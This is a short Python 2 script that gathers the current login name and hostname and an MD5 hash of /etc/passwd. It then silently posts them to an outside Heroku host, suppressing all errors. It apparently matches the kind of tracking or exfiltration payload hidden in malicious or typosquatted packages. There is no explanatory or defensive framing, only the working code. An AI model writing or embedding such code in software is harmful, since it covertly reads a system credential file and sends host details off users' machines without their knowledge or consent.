import os
import urllib
import urllib2
import hashlib
import platform

try:
    uname = os.getlogin()
except Exception as e:
    uname = '[%s]' % e

try:
    host = platform.uname()[1]
except Exception as e:
    host = '[%s]' % e

try:
    fhash = hashlib.md5(open('/etc/passwd').read()).hexdigest()
except Exception as e:
    fhash = '[%s]' % e

data = urllib.urlencode({'uname': uname, 'host': host, 'fhash': fhash})

try:
    urllib2.urlopen('http://python-nation.herokuapp.com/', data)
except Exception as e:
    pass